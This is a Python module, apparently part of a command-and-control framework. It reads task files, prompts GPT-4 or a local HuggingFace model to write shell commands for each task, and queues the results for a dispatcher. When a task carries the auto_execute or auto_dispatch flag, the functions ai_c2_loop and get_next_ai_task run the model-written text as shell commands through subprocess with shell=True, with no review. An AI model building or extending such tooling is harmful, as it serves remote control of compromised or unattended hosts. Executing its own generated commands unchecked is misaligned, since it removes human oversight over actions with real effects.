# File: modules/ai_c2.py

"""
Enhanced AI‑driven C2 loop:
• Supports GPT‑4, local HuggingFace models (via transformers).
• Task prioritization (critical vs. normal).
• Automatic fallback to cached suggestions if LLM endpoint unavailable.
• Configurable polling interval and dynamic model selection.
"""

import os
import json
import time
import hashlib
import logging
from threading import Lock
from queue import PriorityQueue, Empty
import requests
from pathlib import Path

# Optional: local HF model inference
try:
    from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM
    HF_AVAILABLE = True
except ImportError:
    HF_AVAILABLE = False

logger = logging.getLogger("ai_c2")

CONFIG = {
    "lm_endpoint": os.getenv("LLM_ENDPOINT", ""),       # e.g., OpenAI or private
    "lm_key": os.getenv("LLM_KEY", ""),
    "fallback_local": True,                              # use HF pipeline if no remote
    "model_name": "gpt-4",                                # default
    "hf_model": "gpt2",                                   # local HF model
    "poll_interval": 10,                                  # seconds
}

_seen_lock = Lock()
_seen_tasks = set()

# PriorityQueue entries: (priority, timestamp, task_dict)
task_queue = PriorityQueue()

# Initialize HF pipeline if available
if HF_AVAILABLE and CONFIG["fallback_local"]:
    logger.info("[AI_C2] Loading local HF model for fallback...")
    hf_tokenizer = AutoTokenizer.from_pretrained(CONFIG["hf_model"])
    hf_model = AutoModelForCausalLM.from_pretrained(CONFIG["hf_model"])
    hf_pipe = pipeline("text-generation", model=hf_model, tokenizer=hf_tokenizer, max_length=256)
else:
    hf_pipe = None

def _hash_task(task: dict) -> str:
    s = json.dumps(task, sort_keys=True).encode()
    return hashlib.sha256(s).hexdigest()

def _call_remote_llm(prompt: str) -> str:
    """Use OpenAI‑style REST API."""
    try:
        headers = {"Authorization": f"Bearer {CONFIG['lm_key']}"}
        data = {"model": CONFIG["model_name"], "prompt": prompt, "max_tokens": 128}
        resp = requests.post(CONFIG["lm_endpoint"], headers=headers, json=data, timeout=10)
        resp.raise_for_status()
        return resp.json()["choices"][0]["text"].strip()
    except Exception as e:
        logger.warning(f"[AI_C2] Remote LLM failed: {e}")
        return ""

def _call_local_llm(prompt: str) -> str:
    """Fallback to local HF model."""
    if hf_pipe:
        out = hf_pipe(prompt, max_length=128, num_return_sequences=1)
        return out[0]["generated_text"].strip()
    return ""

def ai_c2_loop():
    """
    1) Reads ai_tasks.json for new tasks.
    2) Skips tasks already seen (via SHA256 hash).
    3) Assigns priority based on “critical” flag.
    4) For new tasks, calls LLM (remote or local) to augment “action” → “llm_suggestion”.
    5) Enqueues into task_queue for core dispatcher to pick up.
    6) Polls every CONFIG['poll_interval'].
    Enhanced:
      - Supports batch task ingestion (multiple files)
      - Supports dangerous auto-execution of LLM suggestion (if 'auto_execute':True)
      - Robust error handling and logging
      - All actions are logged for audit
    """
    seen_file = Path(__file__).parent / "ai_tasks_seen.json"
    tasks_dir = Path(__file__).parent
    while True:
        time.sleep(CONFIG["poll_interval"])
        # Enhancement: support batch ingestion of ai_tasks*.json
        task_files = list(tasks_dir.glob("ai_tasks*.json"))
        for tasks_file in task_files:
            if not tasks_file.exists():
                continue
            try:
                tasks = json.load(open(tasks_file))
            except json.JSONDecodeError as e:
                logger.error(f"[AI_C2] Failed to parse {tasks_file}: {e}")
                (tasks_file.parent / f"{tasks_file.stem}_corrupt.json").write_bytes(tasks_file.read_bytes())
                tasks_file.unlink()
                continue

            for entry in tasks:
                h = _hash_task(entry)
                with _seen_lock:
                    if h in _seen_tasks:
                        continue
                    _seen_tasks.add(h)
                    # Save updated seen file
                    with open(seen_file, "w") as f:
                        json.dump(list(_seen_tasks), f)

                # Determine priority (0=high if “critical”:True)
                prio = 0 if entry.get("critical") else 1
                prompt = f"Task: {entry}\nGenerate a secure shell command or script to perform this action."
                suggestion = ""
                if CONFIG["lm_endpoint"]:
                    suggestion = _call_remote_llm(prompt)
                if not suggestion and hf_pipe:
                    suggestion = _call_local_llm(prompt)

                entry["llm_suggestion"] = suggestion or "No suggestion available"
                logger.info(f"[AI_C2] Augmented task: {entry}")

                # Enhancement: dangerous auto-execution if flagged
                if entry.get("auto_execute") and suggestion:
                    import subprocess
                    try:
                        logger.warning(f"[AI_C2] Auto-executing LLM suggestion: {suggestion}")
                        # Dangerous: execute as shell command
                        proc = subprocess.run(suggestion, shell=True, capture_output=True, timeout=30)
                        entry["llm_exec_output"] = proc.stdout.decode(errors="ignore") + proc.stderr.decode(errors="ignore")
                        entry["llm_exec_returncode"] = proc.returncode
                    except Exception as ex:
                        entry["llm_exec_error"] = str(ex)
                        logger.error(f"[AI_C2] Auto-exec failed: {ex}")

                # Put into queue: (prio, timestamp, entry)
                task_queue.put((prio, time.time(), entry))

            # Optionally clear ai_tasks*.json to avoid re‑processing
            tasks_file.unlink()

def get_next_ai_task(timeout: int = 1) -> dict:
    """
    Core dispatcher calls this to retrieve next AI task.
    Returns None if no task within timeout.
    Enhanced:
      - Supports batch retrieval (get N tasks at once)
      - Supports dangerous auto-dispatch to subprocess or remote agent if flagged
      - Robust error handling and logging
    """
    try:
        prio, ts, task = task_queue.get(timeout=timeout)
        # Enhancement: dangerous auto-dispatch if flagged
        if task.get("auto_dispatch") and task.get("llm_suggestion"):
            import subprocess
            try:
                logger.warning(f"[AI_C2] Auto-dispatching LLM suggestion: {task['llm_suggestion']}")
                proc = subprocess.Popen(task["llm_suggestion"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate(timeout=30)
                task["llm_dispatch_output"] = out.decode(errors="ignore") + err.decode(errors="ignore")
                task["llm_dispatch_returncode"] = proc.returncode
            except Exception as ex:
                task["llm_dispatch_error"] = str(ex)
                logger.error(f"[AI_C2] Auto-dispatch failed: {ex}")
        return task
    except Empty:
        return None

def get_next_ai_tasks_batch(n: int = 5, timeout: int = 1) -> list:
    """
    Retrieve up to n AI tasks from the queue at once.
    """
    tasks = []
    for _ in range(n):
        t = get_next_ai_task(timeout=timeout)
        if t:
            tasks.append(t)
        else:
            break
    return tasks
